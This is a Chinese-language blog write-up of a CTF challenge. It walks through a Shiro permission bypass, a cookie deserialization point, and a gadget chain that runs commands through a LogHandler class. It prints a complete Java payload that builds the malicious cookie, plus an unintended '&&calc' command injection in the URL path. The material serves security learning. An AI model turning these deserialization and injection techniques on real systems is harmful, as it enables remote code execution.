@@ -1,0 +1,302 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>逆向学习fastjson反序列化始 - 像清水一般清澈透明</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Summersec,"> 
+    <meta name="description" content="前言&amp;emsp;&amp;emsp; 这是某银行的内部的一个CTF比赛，受邀参加。题目三个关键词权限绕过、shiro、反序列化，题目源码已经被修改，但考察本质没有，题目源码会上传到JavaLearnVuln,"> 
+    <meta name="author" content="Samny"> 
+    <link rel="alternative" href="atom.xml" title="像清水一般清澈透明" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 4.1.1"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">像清水一般清澈透明</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="icon-home image-icon" href="javascript:;" data-url="https://summersec.github.io"></a>
+    <div title="播放/暂停" class="icon-play"></div>
+    <h3 class="subtitle">逆向学习fastjson反序列化始</h3>
+    <div class="social">
+        <!--<div class="like-icon">-->
+            <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+        <!--</div>-->
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">逆向学习fastjson反序列化始</h1>
+        <div class="stuff">
+            <span>一月 05, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Java-shiro/" rel="tag">反序列化 Java shiro</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&emsp;&emsp; 这是某银行的内部的一个CTF比赛，受邀参加。题目三个关键词<code>权限绕过</code>、<code>shiro</code>、<code>反序列化</code>，题目源码已经被修改，但考察本质没有，题目源码会上传到<a href="https://github.com/SummerSec/JavaLearnVulnerability" target="_blank" rel="noopener">JavaLearnVulnerability</a>。</p>
+<hr>
+<h1 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h1><ul>
+<li>xray测试shiro的key</li>
+<li>dirsearch跑目录</li>
+<li>sqlmap测试登陆框是否存在sql注入</li>
+</ul>
+<hr>
+<h1 id="白盒代码审计"><a href="#白盒代码审计" class="headerlink" title="白盒代码审计"></a>白盒代码审计</h1><h2 id="源码初步分析"><a href="#源码初步分析" class="headerlink" title="源码初步分析"></a>源码初步分析</h2><ul>
+<li>版本 shiro == 1.5.3（不存在remember反序列化漏洞，但存在CVE-2020-13933权限绕过漏洞）<br><img src="https://img-blog.csdnimg.cn/20210102135348640.png" alt="在这里插入图片描述"></li>
+</ul>
+<hr>
+<ul>
+<li>shiro验证通过Realm的方式判断用户是否合法，此处重写<code>doGetAuthorizationInfo</code>方法，账户名<code>admin</code>（可能有用）。</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> AuthenticationInfo <span class="title">doGetAuthenticationInfo</span><span class="params">(AuthenticationToken authenticationToken)</span> <span class="keyword">throws</span> AuthenticationException </span>&#123;</span><br><span class="line">        String username = (String)authenticationToken.getPrincipal();</span><br><span class="line">        <span class="keyword">if</span> (!<span class="string">"admin"</span>.equals(username)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> UnknownAccountException(<span class="string">"unkown user"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> SimpleAuthenticationInfo(username, UUID.randomUUID().toString().replaceAll(<span class="string">"-"</span>, <span class="string">""</span>), getName());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<ul>
+<li>访问控制权限，可能看到<code>index</code>、<code>dologin</code>存在访问权限。<blockquote>
+<pre><code>* anon：匿名用户可访问
+* authc：认证用户可访问
+* user：使用rememberMe可访问
+* perms：对应权限可访问
+* role：对应角色权限可访问</code></pre></blockquote>
+</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="function">ShiroFilterFactoryBean <span class="title">shiroFilterFactoryBean</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ShiroFilterFactoryBean bean = <span class="keyword">new</span> ShiroFilterFactoryBean();</span><br><span class="line">    bean.setSecurityManager(<span class="keyword">this</span>.securityManager());</span><br><span class="line">    bean.setLoginUrl(<span class="string">"/login"</span>);</span><br><span class="line">    Map&lt;String, String&gt; map = <span class="keyword">new</span> LinkedHashMap();</span><br><span class="line">    map.put(<span class="string">"/doLogin"</span>, <span class="string">"anon"</span>);</span><br><span class="line">    map.put(<span class="string">"/index/*"</span>, <span class="string">"authc"</span>);</span><br><span class="line">    bean.setFilterChainDefinitionMap(map);</span><br><span class="line">    <span class="keyword">return</span> bean;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<ul>
+<li><code>SQL注入？</code>第一眼反应感觉可能存在注入漏洞或者是XSS但又想到是CTF比赛，应该是不会考察XSS，所以觉得是SQL注入漏洞，然后用SQLMAP尝试一波注入绕过后，没有发现SQL注入漏洞。</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">filter</span><span class="params">(String param)</span> </span>&#123;</span><br><span class="line">        String[] keyWord = <span class="keyword">new</span> String[]&#123;<span class="string">"'"</span>, <span class="string">"\""</span>, <span class="string">"select"</span>, <span class="string">"union"</span>, <span class="string">"/;"</span>, <span class="string">"/%3b"</span>&#125;;</span><br><span class="line">        String[] var3 = keyWord;</span><br><span class="line">        <span class="keyword">int</span> var4 = keyWord.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> var5 = <span class="number">0</span>; var5 &lt; var4; ++var5) &#123;</span><br><span class="line">            String i = var3[var5];</span><br><span class="line">            param = param.replaceAll(i, <span class="string">""</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> param;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<hr>
+<ul>
+<li>远程命令执行？翻遍代码发现调用<code>exeCmd</code>方法只有<code>LogHandler</code>。</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">exeCmd</span><span class="params">(String commandStr)</span> </span>&#123;</span><br><span class="line">        BufferedReader br = <span class="keyword">null</span>;</span><br><span class="line">        String OS = System.getProperty(<span class="string">"os.name"</span>).toLowerCase();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Process p = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (OS.startsWith(<span class="string">"win"</span>))&#123;</span><br><span class="line">                p = Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"cmd"</span>, <span class="string">"/c"</span>, commandStr&#125;);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                p = Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/bash"</span>, <span class="string">"-c"</span>, commandStr&#125;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(p.getInputStream()));</span><br><span class="line">            String line = <span class="keyword">null</span>;</span><br><span class="line">            StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>((line = br.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                sb.append(line + <span class="string">"\n"</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> sb.toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var5) &#123;</span><br><span class="line">            var5.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="灰盒测试"><a href="#灰盒测试" class="headerlink" title="灰盒测试"></a>灰盒测试</h1><ul>
+<li>根据获取的账号<code>admin</code>尝试爆破（无果）</li>
+<li>sql注入再次尝试根据前面过滤掉参数进行bypass（无果），后期发现根本没有数据库链接操作，不可能存在sql注入。</li>
+<li>根据获取的shiro版本可知，没有shiro反序列化漏洞但有权限绕过（成功）。</li>
+</ul>
+<p>&emsp;&emsp; 目前为止只能根据页面知道，该页面是一个<code>访问日志</code>展示页面。<br> <img src="https://img-blog.csdnimg.cn/20210104152919888.png" alt="在这里插入图片描述"></p>
+<hr>
+<h1 id="源码深度刨析"><a href="#源码深度刨析" class="headerlink" title="源码深度刨析"></a>源码深度刨析</h1><h2 id="深度分析"><a href="#深度分析" class="headerlink" title="深度分析"></a>深度分析</h2><p>&emsp;&emsp; Javaweb题目当然还是得从web页面分析，看源码分析一共就两个类访问控制器是处理web请求的。</p>
+<ul>
+<li><code>IndexController</code>处理登录前后页面</li>
+<li><code>LoginController</code>处理登录请求页面<br>&emsp;&emsp; 前面分析到没有数据库，在源码也没发现登录的账号和密码故不用考虑 <code>LoginController</code>类，深度分析<code>IndexController</code>类发现该类存在反序列化操作。</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping</span>(&#123;<span class="string">"/index/&#123;name&#125;"</span>&#125;)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">index</span><span class="params">(HttpServletRequest request, HttpServletResponse response, @PathVariable String name)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Cookie[] cookies = request.getCookies();</span><br><span class="line">        <span class="keyword">boolean</span> exist = <span class="keyword">false</span>;</span><br><span class="line">        Cookie cookie = <span class="keyword">null</span>;</span><br><span class="line">        User user = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (cookies != <span class="keyword">null</span>) &#123;</span><br><span class="line">            Cookie[] var8 = cookies;</span><br><span class="line">            <span class="keyword">int</span> var9 = cookies.length;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> var10 = <span class="number">0</span>; var10 &lt; var9; ++var10) &#123;</span><br><span class="line">                Cookie c = var8[var10];</span><br><span class="line">                <span class="comment">//判断cookie中是否存在hacker字段</span></span><br><span class="line">                <span class="keyword">if</span> (c.getName().equals(<span class="string">"hacker"</span>)) &#123;</span><br><span class="line">                    exist = <span class="keyword">true</span>;</span><br><span class="line">                    cookie = c;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">		<span class="comment">// 存在hacker字段，执行反序列化操作</span></span><br><span class="line">		<span class="comment">// </span></span><br><span class="line">        <span class="keyword">if</span> (exist) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">byte</span>[] bytes = Tools.base64Decode(cookie.getValue());</span><br><span class="line">            <span class="comment">//反序列化操作点</span></span><br><span class="line">            user = (User)Tools.deserialize(bytes);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 没有hacker字段，添加一个并设置其值</span></span><br><span class="line">            user = <span class="keyword">new</span> User();</span><br><span class="line">            user.setID(<span class="number">1</span>);</span><br><span class="line">            user.setUserName(name);</span><br><span class="line">            cookie = <span class="keyword">new</span> Cookie(<span class="string">"hacker"</span>, Tools.base64Encode(Tools.serialize(user)));</span><br><span class="line">            response.addCookie(cookie);</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="comment">// 添加值到前端页面</span></span><br><span class="line">        request.setAttribute(<span class="string">"hacker"</span>, user);</span><br><span class="line">        request.setAttribute(<span class="string">"logs"</span>, <span class="keyword">new</span> LogHandler());</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"index"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>前端源码<br><img src="https://img-blog.csdnimg.cn/20210104152954385.png" alt="在这里插入图片描述"></li>
+<li><code>存在反序列化点，下一步肯定构造反序列化请求，但如何构造反序列化请求呢？</code>前文提及到调用<code>exeCmd</code>方法只有<code>LogHandler</code>类。分析该类，两个方法都调用<code>exeCmd</code>执行命令。<code>invoke</code>方法里面调用的<code>exeCmd</code>是执行<code>wirteLog</code>命令，而<code>toString</code>方法里面调用<code>exeCmd</code>是执行<code>readLog</code>命令。</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LogHandler</span> <span class="keyword">extends</span> <span class="title">HashSet</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Object target;</span><br><span class="line">    <span class="keyword">private</span> String readLog = <span class="string">"tail  accessLog.txt"</span>;</span><br><span class="line">    <span class="keyword">private</span> String writeLog = <span class="string">"echo /test &gt;&gt; accessLog.txt"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LogHandler</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LogHandler</span><span class="params">(Object target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line">		</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">// 请求url路径写入访问日志</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        Tools.exeCmd(<span class="keyword">this</span>.writeLog.replaceAll(<span class="string">"/test"</span>, (String)args[<span class="number">0</span>]));</span><br><span class="line">        <span class="keyword">return</span> method.invoke(<span class="keyword">this</span>.target, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">// 读取日志返回结果</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Tools.exeCmd(<span class="keyword">this</span>.readLog);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>总结下目前为止所有的信息点：</p>
+<ol>
+<li>存在权限绕过，URL：<code>index/%3b/admin</code>(/%3b可以是<code>/&#39;/</code>, <code>select</code>, <code>union</code>, <code>/;</code>之一)</li>
+<li>存在反序列化点<code>IndexController#index</code>，构造请求<code>cookie</code>一定要有<code>hacker</code>字段。</li>
+<li><code>index/admin</code>是访问日志</li>
+<li>反序列化执行的点在<code>LogHandler</code>其中的两个方法</li>
+</ol>
+<hr>
+<h2 id="Payload构造"><a href="#Payload构造" class="headerlink" title="Payload构造"></a>Payload构造</h2><p>下面两端代码分别是通过反射调用<code>invoke</code>和<code>toString</code>方法达到执行命令目的，对比一下很明显<code>toString</code>方法更加的简单质朴。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">invoke</span><span class="params">()</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">    LogHandler logHandler = <span class="keyword">new</span> LogHandler();</span><br><span class="line">    Field wirtelog = logHandler.getClass().getDeclaredField(<span class="string">"writeLog"</span>);</span><br><span class="line">    wirtelog.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    wirtelog.set(logHandler, <span class="string">"calc"</span>);</span><br><span class="line">    Object ob = <span class="keyword">new</span> Object();</span><br><span class="line">    Method method = logHandler.getClass().getMethod("invoke", Object.class, Method.class, Object[].class);</span><br><span class="line">    Object[] obs = <span class="keyword">new</span> Object[]&#123;<span class="string">"asd"</span>,<span class="string">"asd"</span>&#125;;</span><br><span class="line">    logHandler.invoke(ob,method,obs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210104181755765.gif" alt="在这里插入图片描述"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ToString</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        LogHandler logHandler = <span class="keyword">new</span> LogHandler();</span><br><span class="line">        Field readlog = logHandler.getClass().getDeclaredField(<span class="string">"readLog"</span>);</span><br><span class="line">        readlog.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        readlog.set(logHandler, <span class="string">"calc"</span>);</span><br><span class="line">        logHandler.toString();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210104181749788.gif" alt="在这里插入图片描述"></p>
+<hr>
+<p>&emsp;&emsp; 反序列化点get！反序列化目标get！最后一步构造反序列化链！现在缺少一个封装类将构造好的类封装发给服务器直接反序列化，<code>ysoserial</code>其中的CC5中使用的<code>BadAttributeValueExpException</code>异常类满足要求。最终Payload如下：</p>
+<hr>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Calc</span><span class="params">()</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">    LogHandler logHandler = <span class="keyword">new</span> LogHandler();</span><br><span class="line">    Field readlog = logHandler.getClass().getDeclaredField(<span class="string">"readLog"</span>);</span><br><span class="line">    readlog.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    readlog.set(logHandler, <span class="string">"calc"</span>);</span><br><span class="line">    BadAttributeValueExpException badAttributeValueExpException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">    Field field = badAttributeValueExpException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">    field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    field.set(badAttributeValueExpException, logHandler);</span><br><span class="line">    String datas = Tools.base64Encode(Tools.serialize(badAttributeValueExpException));</span><br><span class="line">    System.out.println(<span class="string">"Cookie: "</span> + <span class="string">"hacker="</span>+ datas);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210104181738312.gif" alt="在这里插入图片描述"></p>
+<hr>
+<h2 id="非预期–执行命令"><a href="#非预期–执行命令" class="headerlink" title="非预期–执行命令"></a>非预期–执行命令</h2><p><strong>效果如下：访问/index/admin&amp;&amp;calc会执行命令</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/20210104202319514.gif" alt="在这里插入图片描述"></p>
+<h3 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h3><p>&emsp;&emsp; 根本原因在下面这一段，作者没有考虑到用户会使用管道来执行命令，直接将url路径直接就写访问日志中，导致执行命令。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        Tools.exeCmd(<span class="keyword">this</span>.writeLog.replaceAll(<span class="string">"/test"</span>, (String)args[<span class="number">0</span>]));</span><br><span class="line">        <span class="keyword">return</span> method.invoke(<span class="keyword">this</span>.target, args);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a>知识补充</h1><p>&emsp;&emsp; 写到这，其实是对shiro一些知识的补充。前期对shiro了解较少，后期做了大量知识补充。官方给的是jar包，反编译之后改成自己的踩了 一些坑。顺便记录一下，只想看题目分析的可以Pass。</p>
+<hr>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><hr>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1>
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='https://link.hhtjim.com/163/574566207.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='https://link.hhtjim.com/qq/playsong.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+        data-ae='true'
+        data-ci='a69212da3fc88cd39af9'
+        data-cs='33d19613b15eb03266763f3a34a0d745cd545464'
+        data-r='gittalk'
+        data-o='summersec'
+        data-a='summersec'
+        data-d='true'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#黑盒测试"><span class="toc-number">2.</span> <span class="toc-text">黑盒测试</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#白盒代码审计"><span class="toc-number">3.</span> <span class="toc-text">白盒代码审计</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#源码初步分析"><span class="toc-number">3.1.</span> <span class="toc-text">源码初步分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#灰盒测试"><span class="toc-number">4.</span> <span class="toc-text">灰盒测试</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#源码深度刨析"><span class="toc-number">5.</span> <span class="toc-text">源码深度刨析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#深度分析"><span class="toc-number">5.1.</span> <span class="toc-text">深度分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小结"><span class="toc-number">5.2.</span> <span class="toc-text">小结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Payload构造"><span class="toc-number">5.3.</span> <span class="toc-text">Payload构造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#非预期–执行命令"><span class="toc-number">5.4.</span> <span class="toc-text">非预期–执行命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原因分析"><span class="toc-number">5.4.1.</span> <span class="toc-text">原因分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#知识补充"><span class="toc-number">6.</span> <span class="toc-text">知识补充</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">7.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-number">8.</span> <span class="toc-text">参考</span></a></li></ol>
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<span id="busuanzi_container_page_pv">
+   本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+</span>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/diaspora.js"></script>
+<script src="/js/snow.js"></script>
+<script src="/js/test.js"></script>
+<script src="/js/tx.js"></script>
+<script src="/js/x.js"></script>
+<script src="/js/xiantiao.js"></script>
+<script src="/js/baidu.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
